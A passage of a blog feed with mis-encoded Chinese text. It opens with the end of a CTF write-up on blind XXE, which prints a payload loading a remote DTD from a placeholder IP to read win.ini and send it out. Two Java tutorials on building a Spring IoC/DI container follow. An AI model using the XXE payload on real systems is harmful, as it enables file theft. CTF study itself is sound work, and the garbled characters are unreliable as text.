ä»¥åçš„æ•°æ®ã€‚</p></li><li><p>æ”»å‡»çš„payload</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [ </span><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;å…¬ç½‘IP/test.dtd&quot;</span> &gt;</span></span><span class="hljs-meta">%remote;%int;%send;</span><span class="hljs-meta">]&gt;</span></code></pre></div></li><li><p>test.dtdå†…å®¹</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///c:/windwos/win.ini&quot;</span>&gt;</span><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">int</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://å…¬ç½‘IP?p=%file;&#x27;&gt;&quot;</span>&gt;</span></code></pre></div></li><li><p>æ— æŠ¥é”™éœ€è¦è®¿é—®æ¥å—æ•°æ®åº“çš„æ—¥å¿—ä¿¡æ¯ï¼Œbase64è§£ç å¯ä»¥å¾—åˆ°æ•°æ®</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æš‘å‡æœ€åå‡ å¤©ï¼è‚çˆ†ï¼ˆæ‰‹å†™ï¼‰ä¸€ä¸ªSpringä¹‹Day3ä¸‹åˆ</title>
    <link href="/2022/08/15/spring_day03.1/"/>
    <url>/2022/08/15/spring_day03.1/</url>
    
    <content type="html"><![CDATA[<h1 id="Day03ä¸‹åˆâ€”Spring-å®ŒæˆDI"><a href="#Day03ä¸‹åˆâ€”Spring-å®ŒæˆDI" class="headerlink" title="Day03ä¸‹åˆâ€”Spring å®ŒæˆDI"></a>Day03ä¸‹åˆâ€”Spring å®ŒæˆDI</h1><p>[TOC]</p><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><ul><li><p>å…¥å£ï¼šgetBean()æ–¹æ³•</p></li><li><p>ApplicationContextä¸­å®šä¹‰å¥½IoCå®¹å™¨</p></li><li><p>BeanWrapperä¿å­˜åˆ°Mapä¸­</p></li><li><p>æ‰€ä»¥è®¾è®¡ä¸¤ä¸ªMap</p><ul><li>factoryBeanObjectCacheï¼šä¿å­˜å•ä¾‹å¯¹è±¡çš„ç¼“å­˜</li><li>factoryBeanInstanceCacheï¼šä¿å­˜BeanWrapperçš„ç¼“å­˜</li></ul><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyApplicationContext</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">MyDefaultListableBeanFactory</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MyBeanFactory</span> &#123;...          <span class="hljs-comment">//ç”¨æ¥ä¿è¯æ³¨å†Œå¼å•ä¾‹çš„å®¹å™¨</span>    <span class="hljs-keyword">private</span> Map&lt;String,Object&gt; factoryBeanObjectCache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();    <span class="hljs-comment">//ç”¨æ¥å­˜å‚¨æ‰€æœ‰çš„è¢«ä»£ç†è¿‡çš„å¯¹è±¡</span>    <span class="hljs-keyword">private</span> Map&lt;String,MyBeanWrapper&gt; factoryBeanInstanceCache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();     ...</code></pre></div></li></ul><h2 id="å®Œå–„getBean"><a href="#å®Œå–„getBean" class="headerlink" title="å®Œå–„getBean()"></a>å®Œå–„getBean()</h2><ul><li><p>BeanPostProcessorï¼šæˆ‘ä»¬çŸ¥é“å®ƒæ˜¯åŸç”Ÿspringä¸­ä¸ºå¯¹è±¡åˆå§‹åŒ–äº‹ä»¶è®¾ç½®çš„ä¸€ç§å›è°ƒæœºåˆ¶ã€‚æš‚æ—¶åªåšå£°æ˜ï¼Œæ²¡åšå…·ä½“å®ç°ã€‚</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.beans.config;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyBeanPostProcessor</span> &#123;    <span class="hljs-comment">//TODO ä¸ºåœ¨Beançš„åˆå§‹åŒ–ä¹‹å‰æä¾›å›è°ƒæ¥å£</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">postProcessBeforeInitialization</span><span class="hljs-params">(Object bean,String beanName)</span><span class="hljs-keyword">throws</span> Exception&#123;        <span class="hljs-keyword">return</span> bean;    &#125;    <span class="hljs-comment">//TODO ä¸ºåœ¨Beançš„åˆå§‹åŒ–ä¹‹åæä¾›å›è°ƒæ¥å£</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">postProcessAfterInitialization</span><span class="hljs-params">(Object bean,String beanName)</span><span class="hljs-keyword">throws</span> Exception&#123;        <span class="hljs-keyword">return</span> bean;    &#125;&#125;</code></pre></div></li><li><p>åœ¨MyApplicationContextå®Œå–„ä»£ç </p></li><li><p>å¤§ä½“æµç¨‹</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getBean</span><span class="hljs-params">(String beanName)</span> <span class="hljs-keyword">throws</span> Exception &#123;    <span class="hljs-type">MyBeanDefinition</span> <span class="hljs-variable">beanDefinition</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.beanDefinitionMap.get(beanName);    <span class="hljs-comment">//ç”Ÿæˆé€šçŸ¥äº‹ä»¶</span>    <span class="hljs-type">MyBeanPostProcessor</span> <span class="hljs-variable">beanPostProcessor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyBeanPostProcessor</span>();      <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> instantiateBean(beanDefinition);    <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> == instance)<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;      <span class="hljs-comment">//åœ¨å®ä¾‹åˆå§‹åŒ–ä»¥å‰è°ƒç”¨ä¸€æ¬¡</span>    beanPostProcessor.postProcessBeforeInitialization(instance,beanName);      <span class="hljs-type">MyBeanWrapper</span> <span class="hljs-variable">beanWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyBeanWrapper</span>(instance);      <span class="hljs-built_in">this</span>.factoryBeanInstanceCache.put(beanName,beanWrapper);      <span class="hljs-comment">//åœ¨æ˜¯å®ä¾‹åˆå§‹åŒ–ä»¥åå†è°ƒç”¨ä¸€æ¬¡</span>    beanPostProcessor.postProcessAfterInitialization(instance,beanName);      populateBean(beanName,instance);        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.factoryBeanInstanceCache.get(beanName).getWrappedInstance();&#125;</code></pre></div></li><li><p>instantiateBeanæ–¹æ³•ï¼šè¿”å›ä¸€ä¸ªå®ä¾‹Bean</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">instantiateBean</span><span class="hljs-params">(MyBeanDefinition beanDefinition)</span> &#123;    <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;    <span class="hljs-type">String</span> <span class="hljs-variable">beanClassName</span> <span class="hljs-operator">=</span> beanDefinition.getBeanClassName();      <span class="hljs-keyword">try</span> &#123;        <span class="hljs-comment">//å› ä¸ºæ ¹æ®Classæ‰èƒ½ç¡®å®šä¸€ä¸ªç±»æ˜¯å¦æœ‰å®ä¾‹</span>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.factoryBeanObjectCache.containsKey(beanClassName))&#123;            instance = <span class="hljs-built_in">this</span>.factoryBeanObjectCache.get(beanClassName);        &#125;<span class="hljs-keyword">else</span> &#123;            Class&lt;?&gt; clazz = Class.forName(beanClassName);            instance = clazz.newInstance();            <span class="hljs-built_in">this</span>.factoryBeanObjectCache.put(beanDefinition.getFactoryBeanName(),instance);        &#125;        <span class="hljs-keyword">return</span> instance;    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;        e.printStackTrace();    &#125; <span class="hljs-keyword">catch</span> (InstantiationException e) &#123;        e.printStackTrace();    &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;        e.printStackTrace();    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;&#125;</code></pre></div></li><li><p>populateBeanæ–¹æ³•</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">populateBean</span><span class="hljs-params">(String beanName, Object instance)</span> &#123;      Class&lt;?&gt; clazz = instance.getClass();            <span class="hljs-keyword">if</span> (!(clazz.isAnnotationPresent(MyController.class) || clazz.isAnnotationPresent(MyService.class)))&#123;          <span class="hljs-keyword">return</span>;      &#125;        Field[] fields = clazz.getDeclaredFields();      <span class="hljs-keyword">for</span> (Field field : fields) &#123;          <span class="hljs-keyword">if</span>(!field.isAnnotationPresent(MyAutowired.class))<span class="hljs-keyword">continue</span>;            <span class="hljs-type">MyAutowired</span> <span class="hljs-variable">autowired</span> <span class="hljs-operator">=</span> field.getAnnotation(MyAutowired.class);                    <span class="hljs-type">String</span> <span class="hljs-variable">autowiredBeanName</span> <span class="hljs-operator">=</span> autowired.value().trim();                    <span class="hljs-comment">//æ²¡æœ‰æŒ‡å®šbeanNameå°±é‡‡ç”¨é»˜è®¤ç±»åä½œä¸ºbeanName</span>          <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;&quot;</span>.equals(autowiredBeanName))&#123;              autowiredBeanName = field.getType().getName();          &#125;                    field.setAccessible(<span class="hljs-literal">true</span>);            <span class="hljs-keyword">try</span> &#123;              field.set(instance,<span class="hljs-built_in">this</span>.factoryBeanInstanceCache.get(autowiredBeanName).getWrappedInstance());          &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;              e.printStackTrace();          &#125;      &#125;  &#125;</code></pre></div></li></ul>]]></content>
    
    
    <categories>
      
      <category>æ‰‹å†™spring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æš‘å‡æœ€åå‡ å¤©ï¼è‚çˆ†ï¼ˆæ‰‹å†™ï¼‰ä¸€ä¸ªSpringä¹‹Day3ä¸Šåˆ</title>
    <link href="/2022/08/15/spring_day03/"/>
    <url>/2022/08/15/spring_day03/</url>
    
    <content type="html"><![CDATA[<h1 id="Day03ä¸Šåˆâ€”Spring-IoCé¡¶å±‚ç»“æ„è®¾è®¡"><a href="#Day03ä¸Šåˆâ€”Spring-IoCé¡¶å±‚ç»“æ„è®¾è®¡" class="headerlink" title="Day03ä¸Šåˆâ€”Spring IoCé¡¶å±‚ç»“æ„è®¾è®¡"></a>Day03ä¸Šåˆâ€”Spring IoCé¡¶å±‚ç»“æ„è®¾è®¡</h1><p>[TOC]</p><h2 id="core-é¡¶å±‚æ¥å£-æ ¸å¿ƒæ¨¡å—"><a href="#core-é¡¶å±‚æ¥å£-æ ¸å¿ƒæ¨¡å—" class="headerlink" title="core(é¡¶å±‚æ¥å£)æ ¸å¿ƒæ¨¡å—"></a>core(é¡¶å±‚æ¥å£)æ ¸å¿ƒæ¨¡å—</h2><ul><li><p>åŒºåˆ†BeanFactoryå’ŒFactoryBeanï¼š</p><ul><li>BeanFactoryï¼šBeanå·¥å‚ï¼Œæ˜¯ä¸ªå·¥å‚ï¼Œä¹Ÿå°±æ˜¯IoCå®¹å™¨çš„æœ€é«˜å±‚æ¥å£ï¼Œä½œç”¨æ—¶ç®¡ç†Bean</li><li>FactoryBeanï¼šå·¥å‚Beanï¼Œæ˜¯ä¸€ä¸ªBeanï¼Œä½œç”¨æ—¶äº§ç”Ÿå…¶ä»–Beançš„å®ä¾‹</li></ul></li><li><p>åˆ›å»ºcoreåŒ…ï¼Œå†æ’¸</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.core;<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyFactoryBean</span> &#123;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.core;<span class="hljs-comment">/**</span><span class="hljs-comment"> * å•ä¾‹å·¥å‚çš„é¡¶å±‚è®¾è®¡</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyBeanFactory</span> &#123;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * æ ¹æ®beanNameä»IoCå®¹å™¨ä¸­è·å–ä¸€ä¸ªå®ä¾‹Bean</span><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> beanName</span><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Exception</span><span class="hljs-comment">     */</span>    Object <span class="hljs-title function_">getBean</span><span class="hljs-params">(String beanName)</span> <span class="hljs-keyword">throws</span> Exception;        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getBean</span><span class="hljs-params">(Class&lt;?&gt; beanClass)</span> <span class="hljs-keyword">throws</span> Exception;&#125;</code></pre></div></li></ul><h2 id="beans-é…ç½®å°è£…-æ¨¡å—"><a href="#beans-é…ç½®å°è£…-æ¨¡å—" class="headerlink" title="beans(é…ç½®å°è£…)æ¨¡å—"></a>beans(é…ç½®å°è£…)æ¨¡å—</h2><ul><li><p>åˆ›å»ºåŒ…beans.configï¼Œå†æ’¸</p></li><li><p>BeanDefinition:ä¸»è¦ç”¨äºä¿å­˜Beanç›¸å…³çš„é…ç½®ä¿¡æ¯</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.beans.config;<span class="hljs-keyword">import</span> lombok.Data;<span class="hljs-meta">@Data</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyBeanDefinition</span> &#123;    <span class="hljs-comment">//åŸç”ŸBeançš„å…¨ç±»å</span>    <span class="hljs-keyword">private</span> String beanClassName;    <span class="hljs-comment">//æ ‡è®°æ˜¯å¦å»¶æ—¶åŠ è½½ï¼Œé»˜è®¤ä¸ºfalse</span>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">lazyInit</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;    <span class="hljs-comment">//ä¿å­˜beanName,åœ¨IoCå®¹å™¨ä¸­å­˜å‚¨çš„key</span>    <span class="hljs-keyword">private</span> String factoryBeanName;&#125;</code></pre></div></li><li><p>BeanWrapperï¼šä¸»è¦ç”¨äºå°è£…åˆ›å»ºåçš„å®ä¾‹å¯¹è±¡ï¼Œä»£ç†å¯¹è±¡æˆ–è€…åŸç”Ÿå¯¹è±¡éƒ½æœ‰BeanWrapperæ¥ä¿å­˜</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.beans;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyBeanWrapper</span> &#123;    <span class="hljs-keyword">private</span> Object wrappedInstance;        <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyBeanWrapper</span><span class="hljs-params">(Object wrappedInstance)</span>&#123;        <span class="hljs-built_in">this</span>.wrappedInstance = wrappedInstance;    &#125;        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getWrappedInstance</span><span class="hljs-params">()</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.wrappedInstance;    &#125;    <span class="hljs-comment">// è¿”å›ä»£ç†ä»¥åçš„Class</span>    <span class="hljs-comment">// å¯èƒ½ä¼šæ˜¯è¿™ä¸ª $Proxy0</span>    <span class="hljs-keyword">public</span> Class&lt;?&gt; getWrappedClass()&#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.wrappedInstance.getClass();    &#125;&#125;</code></pre></div></li></ul><h2 id="context-IoCå®¹å™¨-æ¨¡å—"><a href="#context-IoCå®¹å™¨-æ¨¡å—" class="headerlink" title="context(IoCå®¹å™¨)æ¨¡å—"></a>context(IoCå®¹å™¨)æ¨¡å—</h2><ul><li><p>AbstractApplicationContextï¼šIoCå®¹å™¨å®ç°ç±»çš„é¡¶å±‚æŠ½è±¡ç±»ï¼Œå®ç°IoCå®¹å™¨ç›¸å…³çš„å…¬å…±é€»è¾‘ã€‚ä¸ºäº†å°½å¯èƒ½åœ°ç®€å•åŒ–ï¼Œæš‚æ—¶åªè®¾è®¡ä¸€ä¸ªrefresh()æ–¹æ³•ã€‚</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.context.support;<span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAbstractApplicationContext</span> &#123;    <span class="hljs-comment">//å—ä¿æŠ¤ï¼Œåªæä¾›ç»™å­ç±»é‡å†™</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">refresh</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;&#125;&#125;</code></pre></div></li><li><p>DefaultListableBeanFactoryï¼šä¼—å¤šIoCå®¹å™¨çš„å…¸å‹ä»£è¡¨ï¼Œæš‚æ—¶åªè®¾è®¡ä¸€ä¸ªé¡¶å±‚çš„IoCç¼“å­˜ï¼Œä¹Ÿå°±æ˜¯beanDefinitionMapã€‚</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.beans.support;<span class="hljs-keyword">import</span> com.czh.spring.framework.beans.config.MyBeanDefinition;<span class="hljs-keyword">import</span> com.czh.spring.framework.context.support.MyAbstractApplicationContext;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-keyword">import</span> java.util.concurrent.ConcurrentHashMap;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyDefaultListableBeanFactory</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">MyAbstractApplicationContext</span> &#123;    <span class="hljs-comment">//å­˜å‚¨æ³¨å†Œä¿¡æ¯çš„BeanDefinition,ä¼ªIOCå®¹å™¨</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Map&lt;String, MyBeanDefinition&gt; beanDefinitionMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;String, MyBeanDefinition&gt;();&#125;</code></pre></div></li><li><p>BeanDefinitionReaderï¼šå®Œæˆå¯¹application.propertiesé…ç½®æ–‡ä»¶çš„è§£æå·¥ä½œï¼Œå®ç°çœ‹ä»£ç ï¼ˆè¯·ç»†å“ï¼‰</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.beans.support;<span class="hljs-keyword">import</span> com.czh.spring.framework.beans.config.MyBeanDefinition;<span class="hljs-keyword">import</span> java.io.File;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.io.InputStream;<span class="hljs-keyword">import</span> java.net.URL;<span class="hljs-keyword">import</span> java.util.ArrayList;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-keyword">import</span> java.util.Properties;<span class="hljs-comment">/**</span><span class="hljs-comment"> * å¯¹é…ç½®æ–‡ä»¶è¿›è¡ŒæŸ¥æ‰¾ã€è¯»å–ã€è§£æ</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyBeanDefinitionReader</span> &#123;        <span class="hljs-keyword">private</span> List&lt;String&gt; registerBeanClasses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;String&gt;();    <span class="hljs-keyword">private</span> <span class="hljs-type">Properties</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();        <span class="hljs-comment">//å›ºå®šé…ç½®æ–‡ä»¶ä¸­çš„keyï¼Œç›¸å¯¹äºXMLçš„è§„èŒƒ</span>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">SCAN_PACKAGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;scanPackage&quot;</span>;        <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyBeanDefinitionReader</span><span class="hljs-params">(String...locations)</span>&#123;        <span class="hljs-comment">//é€šè¿‡URLå®šä½æ‰¾åˆ°å…¶æ‰€å¯¹åº”çš„æ–‡ä»¶ï¼Œç„¶åè½¬æ¢ä¸ºæ–‡ä»¶æµ</span>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getClass().getClassLoader().getResourceAsStream(locations[<span class="hljs-number">0</span>].replace(<span class="hljs-string">&quot;classpath:&quot;</span>,<span class="hljs-string">&quot;&quot;</span>));        <span class="hljs-keyword">try</span> &#123;            config.load(is);        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;            e.printStackTrace();        &#125;<span class="hljs-keyword">finally</span> &#123;            <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> != is)&#123;                <span class="hljs-keyword">try</span> &#123;                    is.close();                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;                    e.printStackTrace();                &#125;            &#125;        &#125;                doScanner(config.getProperty(SCAN_PACKAGE));    &#125;        <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doScanner</span><span class="hljs-params">(String scanPackage)</span>&#123;        <span class="hljs-comment">//è½¬æ¢ä¸ºæ–‡ä»¶è·¯å¾„ï¼Œå®é™…ä¸Šå°±æ˜¯æŠŠ.æ¢æˆ/</span>        <span class="hljs-comment">//åˆ©ç”¨æ­£åˆ™å·§å¦™å¤„ç†ï¼Œä½ è¯´å¦™ä¸å¦™</span>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getClass().getClassLoader().getResource(<span class="hljs-string">&quot;/&quot;</span>+scanPackage.replaceAll(<span class="hljs-string">&quot;\\.&quot;</span>,<span class="hljs-string">&quot;/&quot;</span>));        <span class="hljs-type">File</span> <span class="hljs-variable">classPath</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(url.getFile());        <span class="hljs-keyword">for</span> (File file : classPath.listFiles()) &#123;            <span class="hljs-keyword">if</span>(file.isDirectory())&#123;                <span class="hljs-comment">//å¦‚æœæ˜¯ç›®å½•å°±æ¥ç€é€’å½’æ‰«æ</span>                doScanner(scanPackage+<span class="hljs-string">&quot;.&quot;</span>+file.getName());            &#125;<span class="hljs-keyword">else</span> &#123;                <span class="hljs-keyword">if</span>(!file.getName().endsWith(<span class="hljs-string">&quot;.class&quot;</span>))<span class="hljs-keyword">continue</span>;<span class="hljs-comment">//å¦‚æœä¸æ˜¯classæ–‡ä»¶å°±è·³è¿‡</span>                <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> (scanPackage + <span class="hljs-string">&quot;.&quot;</span> +file.getName().replace(<span class="hljs-string">&quot;.class&quot;</span>,<span class="hljs-string">&quot;&quot;</span>));<span class="hljs-comment">//æ‹¼æ¥å‡ºclassName</span>                registerBeanClasses.add(className);            &#125;        &#125;    &#125;        <span class="hljs-keyword">public</span> Properties <span class="hljs-title function_">getConfig</span><span class="hljs-params">()</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.config;    &#125;    <span class="hljs-comment">//æŠŠé…ç½®æ–‡ä»¶ä¸­æ‰«æåˆ°çš„æ‰€æœ‰é…ç½®ä¿¡æ¯è½¬æ¢ä¸ºBeanDefinitionå¯¹è±¡ï¼Œä¾¿äºåé¢IoCæ“ä½œ</span>    <span class="hljs-keyword">public</span> List&lt;MyBeanDefinition&gt; <span class="hljs-title function_">loadBeanDefinitions</span><span class="hljs-params">()</span>&#123;        ArrayList&lt;MyBeanDefinition&gt; beanDefinitionList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-keyword">for</span> (String className : registerBeanClasses) &#123;                Class&lt;?&gt; beanClass = Class.forName(className);                <span class="hljs-keyword">if</span>(beanClass.isInterface())<span class="hljs-keyword">continue</span>;<span class="hljs-comment">//å¦‚æœæ˜¯æ¥å£å°±è·³è¿‡ï¼Œå› ä¸ºæ¥å£ä»ç±»ä¸­è·å–</span>                                beanDefinitionList.add(doCreateBeanDefinition(toLowerFirstCase(beanClass.getSimpleName()),beanClass.getName()));                    Class&lt;?&gt;[] interfaces = beanClass.getInterfaces();                <span class="hljs-keyword">for</span> (Class&lt;?&gt; anInterface : interfaces) &#123;                    beanDefinitionList.add(doCreateBeanDefinition(anInterface.getName(),beanClass.getName()));                &#125;            &#125;        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;            e.printStackTrace();        &#125;        <span class="hljs-keyword">return</span> beanDefinitionList;    &#125;    <span class="hljs-comment">//æŠŠæ¯ä¸€ä¸ªé…ç½®ä¿¡æ¯è§£ææˆä¸€ä¸ªBeanDefinition</span>    <span class="hljs-keyword">private</span> MyBeanDefinition <span class="hljs-title function_">doCreateBeanDefinition</span><span class="hljs-params">(String factoryBeanName, String beanClassName)</span> &#123;        <span class="hljs-type">MyBeanDefinition</span> <span class="hljs-variable">beanDefinition</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyBeanDefinition</span>();        beanDefinition.setBeanClassName(beanClassName);        beanDefinition.setFactoryBeanName(factoryBeanName);        <span class="hljs-keyword">return</span> beanDefinition;    &#125;    <span class="hljs-comment">//å°†ç±»åé¦–å­—æ¯æ”¹ä¸ºå°å†™</span>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">toLowerFirstCase</span><span class="hljs-params">(String simpleName)</span>&#123;        <span class="hljs-type">char</span>[] chars = simpleName.toCharArray();        chars[<span class="hljs-number">0</span>] += <span class="hljs-number">32</span>;        <span class="hljs-keyword">return</span> String.valueOf(chars);    &#125;    &#125;</code></pre></div></li><li><p>ApplicationContextï¼šç›´æ¥æ¥è§¦ç”¨æˆ·çš„å…¥å£ï¼Œå®ç°DefaultListableBeanFactoryä¸­çš„refresh()æ–¹æ³•å’ŒBeanFactoryçš„getBean()æ–¹æ³•ï¼Œå®ŒæˆIoCã€DIã€AOPçš„è¡”æ¥</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.context;<span class="hljs-keyword">import</span> com.czh.spring.framework.beans.config.MyBeanDefinition;<span class="hljs-keyword">import</span> com.czh.spring.framework.beans.support.MyBeanDefinitionReader;<span class="hljs-keyword">import</span> com.czh.spring.framework.beans.support.MyDefaultListableBeanFactory;<span class="hljs-keyword">import</span> com.czh.spring.framework.core.MyBeanFactory;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-keyword">import</span> java.util.Properties;<span class="hljs-keyword">import</span> java.util.concurrent.ConcurrentHashMap;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyApplicationContext</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">MyDefaultListableBeanFactory</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MyBeanFactory</span> &#123;    <span class="hljs-keyword">private</span> String[] configLocations;    <span class="hljs-keyword">private</span> MyBeanDefinitionReader reader;        <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyApplicationContext</span><span class="hljs-params">(String...configLocations)</span>&#123;        <span class="hljs-built_in">this</span>.configLocations = configLocations;        <span class="hljs-keyword">try</span> &#123;            refresh();        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">refresh</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-comment">//1.å®šä½é…ç½®æ–‡ä»¶</span>        reader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyBeanDefinitionReader</span>(<span class="hljs-built_in">this</span>.configLocations);        <span class="hljs-comment">//2.åŠ è½½é…ç½®æ–‡ä»¶ï¼Œæ‰«æç›¸å…³çš„ç±»ï¼Œå°è£…æˆBeanDefinition</span>        List&lt;MyBeanDefinition&gt; beanDefinitionList = reader.loadBeanDefinitions();        <span class="hljs-comment">//3.æ³¨å†Œï¼ŒæŠŠé…ç½®ä¿¡æ¯æ”¾åˆ°å®¹å™¨ä¸­(ä¼ªIoCå®¹å™¨)</span>        doRegisterBeanDefinition(beanDefinitionList);        <span class="hljs-comment">//4.æŠŠä¸æ˜¯å»¶æ—¶åŠ è½½çš„ç±»æå‰åˆå§‹åŒ–</span>        doAutowired();    &#125;    <span class="hljs-comment">//åªå¤„ç†éå»¶æ—¶åŠ è½½çš„æƒ…å†µ</span>    <span 